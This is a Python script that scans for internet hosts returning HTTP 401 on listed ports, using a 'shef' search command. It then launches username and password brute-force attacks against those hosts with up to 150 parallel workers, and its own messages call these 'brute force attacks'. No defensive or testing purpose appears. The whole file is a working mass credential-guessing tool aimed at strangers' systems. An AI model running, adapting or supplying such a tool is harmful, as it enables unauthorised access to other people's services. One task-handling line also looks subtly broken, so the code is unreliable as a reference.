import os
import shutil
import subprocess
from concurrent.futures import ProcessPoolExecutor, as_completed
import time
import logging

# Logging configuration
logging.basicConfig(filename="errors.log", level=logging.ERROR, format="%(asctime)s - %(levelname)s - %(message)s")

# Configuration
ports_file = "ports.txt"
files_to_copy = ["passwd.txt", "script.sh", "users.txt"]
httpbrute_dir = "httpbrute"  # Directory containing files to copy
ports_dir = "ports"  # Base directory for port directories
delay_after = 3  # Number of commands to run before pausing
delay_seconds = 5  # Number of seconds to wait during pause
max_concurrent_ports = 150  # Number of concurrent brute force operations

# Ensure the base directory for ports exists
os.makedirs(ports_dir, exist_ok=True)

# Read the ports from ports.txt
try:
    with open(ports_file, "r") as file:
        ports = [line.strip() for line in file if line.strip() and line.strip().isdigit()]
except FileNotFoundError:
    print(f"Error: {ports_file} not found.")
    exit(1)


def process_shef_with_delay(ports: list[str], delay_after: int, delay_seconds: int):
    """
    Process the shef commands sequentially with a delay after every `delay_after` commands.
    Skip if the directory and hosts file already exist.
    """
    for counter, port in enumerate(ports, start=1):
        port_dir = os.path.join(ports_dir, f"port_{port}")
        output_file = os.path.join(port_dir, f"{port}_401.txt")

        # Skip processing if the directory and hosts file already exist
        if os.path.exists(port_dir) and os.path.isfile(output_file):
            print(f"Skipping shef for port {port}: directory and hosts file already exist.")
            continue

        os.makedirs(port_dir, exist_ok=True)

        # Run the 'shef' command and save the output
        try:
            with open(output_file, "w") as f:
                subprocess.run(["shef", "-q", f"country:test '401' port:{port}"], stdout=f, check=True)
        except subprocess.CalledProcessError as e:
            logging.error(f"Error running shef for port {port}: {e}")
            continue

        # Copy necessary files into the directory
        for file in files_to_copy:
            source_path = os.path.join(httpbrute_dir, file)
            destination_path = os.path.join(port_dir, file)
            try:
                shutil.copy(source_path, destination_path)
            except FileNotFoundError:
                print(f"Warning: {file} not found in {httpbrute_dir}.")

        # Introduce a delay after every `delay_after` commands
        if counter % delay_after == 0 and counter < len(ports):
            print(f"Pausing for {delay_seconds} seconds to prevent server overload...")
            time.sleep(delay_seconds)


def brute_force(port: str):
    """
    Execute the brute force script for a given port directory.
    """
    port_dir = os.path.join(ports_dir, f"port_{port}")
    script_path = os.path.join(port_dir, "script.sh")
    host_list_path = os.path.join(port_dir, f"{port}_401.txt")
    user_list_path = os.path.join(port_dir, "users.txt")
    pass_list_path = os.path.join(port_dir, "passwd.txt")

    brute_command = ["bash", script_path, host_list_path, user_list_path, pass_list_path, str(port)]
    print(f"Running brute force for port {port}: {' '.join(brute_command)}")
    try:
        subprocess.run(brute_command, check=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"Error running brute force for port {port}: {e}")


def run_brute_force_dynamically(ports: list[str], max_concurrent_ports: int):
    """
    Dynamically run brute force operations, maintaining a steady stream of `max_concurrent_ports` workers.
    """
    with ProcessPoolExecutor(max_workers=max_concurrent_ports) as executor:
        futures = {}
        remaining_ports = ports[:]

        while remaining_ports or futures:
            # Submit new tasks if there are remaining ports and there are available workers
            while len(futures) < max_concurrent_ports and remaining_ports:
                new_port = remaining_ports.pop(0)
                print(f"Assigning brute force task to port {new_port}")
                futures[executor.submit(brute_force, new_port)] = new_port

            # Wait for any task to complete
            done, _ = next(as_completed(futures), (None, None))
            if done:
                port = futures.pop(done)
                try:
                    done.result()  # This will raise an exception if the task failed
                except Exception as e:
                    logging.error(f"Error in brute force task for port {port}: {e}")


# Main Workflow
if __name__ == "__main__":
    # Step 1: Run 'shef' for all ports with delay
    print("Starting shef processing for all ports...")
    process_shef_with_delay(ports, delay_after, delay_seconds)
    print("Shef processing completed for all ports.")

    # Step 2: Start brute-forcing dynamically
    print("Starting brute force attacks for all ports...")
    run_brute_force_dynamically(ports, max_concurrent_ports)
    print("Brute force operations completed for all ports.")
